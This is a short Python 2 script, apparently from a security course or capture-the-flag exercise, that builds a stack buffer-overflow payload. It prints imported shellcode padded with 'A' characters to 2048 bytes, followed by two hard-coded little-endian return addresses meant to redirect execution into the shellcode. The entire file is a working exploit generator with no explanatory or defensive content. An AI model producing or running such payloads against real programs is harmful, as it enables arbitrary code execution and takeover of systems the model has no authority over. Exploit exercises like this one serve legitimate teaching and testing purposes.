#!/usr/bin/python
from struct import pack
from shellcode import shellcode

#toReturnSC = 0xbffe7c18
#toReturn = 0xbffe842c

toReturnSC = 0xbffe7c18
toReturn = 0xbffe8428

#print shellcode

print shellcode + "A"*(2048 - len(shellcode)) + pack("<I", toReturnSC) + pack("<I", toReturn)
